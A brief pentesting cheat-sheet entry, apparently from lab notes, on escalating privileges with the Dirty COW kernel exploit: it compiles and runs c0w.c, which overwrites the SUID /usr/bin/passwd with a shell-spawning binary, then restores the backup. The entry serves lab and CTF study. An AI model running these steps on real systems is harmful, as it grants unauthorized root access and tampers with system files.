# Dirty C0W

replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

you can download the exploit and compile/run it and gain access with running the passwd file.

```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w

# it may take a while to finish

/usr/bin/passwd
```

and Boom!

{% hint style="warning" %}
remember to recover the 'passwd' file :&#x20;

```bash
mv /tmp/bak /usr/bin/passwd
```
{% endhint %}
